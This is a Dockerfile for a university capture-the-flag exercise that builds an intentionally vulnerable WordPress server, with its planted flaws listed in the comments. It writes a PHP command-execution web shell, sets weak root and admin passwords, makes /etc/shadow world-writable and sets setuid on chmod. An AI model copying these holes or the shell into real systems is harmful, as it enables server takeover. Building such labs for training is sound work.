# UOIT CTF Fall 2016 - Apache 80 Service Dockerfile
# docker build -t "uoit-ctf-2016-apache80" .
#
# Vulnerabilities - Gaining Access:
# - Weak wordpress admin login (adama:lee)
# - /images/baltar.jpg is a shell
# - /c99.php is a shell
# - /wp-content/themes/dark-planet/dark-shell.php is a shell
# - /wp-content/index.php?cmd=whoami is a shell
# - /cgi-bin/log.pl is a shell
# - /images/rh.php is a shell
#
# Vulnerabilities - Escalation:
# - www-data can sudo
# - root weak password 'password' (su)
# - www-data has /bin/sh
# - chmod 777 /etc/shadow
# - chmod u+s /usr/sbin/service
# - chmod u+s /bin/chmod
#
# Vulnerabilities - Other
# - wordpresss DOS - https://www.exploit-db.com/exploits/40288/
#

FROM ubuntu:14.04
MAINTAINER Garrett Hayes <garrett.hayes@uoit.ca>

RUN echo "America/Toronto" > /etc/timezone
RUN dpkg-reconfigure -f noninteractive tzdata

ENV DEBIAN_FRONTEND noninteractive

# Basic Environment Build
RUN apt-get update
RUN apt-get upgrade -y
RUN apt-get dist-upgrade -y
RUN apt-get install net-tools nano curl iputils-ping vim-runtime screen python -y

# OpenSSH
RUN apt-get install openssh-server -y
RUN mkdir /root/.ssh
RUN chmod 700 /root/.ssh
COPY pubkey /root/.ssh/authorized_keys
RUN chmod 600 /root/.ssh/authorized_keys
RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/g' /etc/ssh/sshd_config

# Apache2
RUN apt-get install apache2 php5-mysql php5 libapache2-mod-php5 php5-mcrypt unzip -y
COPY wordpress-configured.tar.gz /var/www/html
RUN tar -xvf /var/www/html/wordpress-configured.tar.gz -C /var/www/html 
RUN rm -rf /var/www/html/wordpress-configured.tar.gz
RUN chown -R www-data:www-data /var/www/html
RUN rm -rf /var/www/html/index.html
COPY 000-default.conf /etc/apache2/sites-available/000-default.conf
RUN sed -i 's/Listen 80/Listen 0.0.0.0:80/g' /etc/apache2/ports.conf

# MySQL
RUN apt-get install mysql-server mysql-client -y
RUN sed -i 's/= mysql/= root/g' /etc/mysql/my.cnf

# Vulns
RUN usermod -a -G sudo www-data
RUN chsh -s /bin/sh www-data
RUN echo "root:password" | chpasswd
RUN echo "www-data:www-data" | chpasswd
RUN chmod 777 /etc/shadow
RUN sed -i 's/) ALL/) NOPASSWD:ALL/g' /etc/sudoers
RUN echo '<?php echo passthru($_GET["cmd"]); ?>' > /var/www/html/wp-content/index.php
RUN a2enmod cgi
COPY log.pl /usr/lib/cgi-bin/
RUN chown -R www-data:www-data /var/www/html
RUN chmod u+s /bin/chmod
RUN chmod +x /usr/lib/cgi-bin/log.pl
RUN chmod u+s /usr/sbin/service

COPY pubkey /root/.ssh/authorized_keys

# Start Script
RUN echo '#!/bin/bash' > /root/start.sh
RUN echo 'service rsyslog start' >> /root/start.sh
RUN echo 'service mysql start' >> /root/start.sh
RUN echo "mysql -u root -e \"CREATE DATABASE wordpress;\"" >> /root/start.sh
RUN echo "mysql -u root wordpress < /var/www/html/db.sql" >> /root/start.sh
RUN echo 'service apache2 start' >> /root/start.sh
RUN echo 'service ssh start' >> /root/start.sh
RUN echo 'bash' >> /root/start.sh
RUN chmod +x /root/start.sh

ENTRYPOINT ["/root/start.sh"]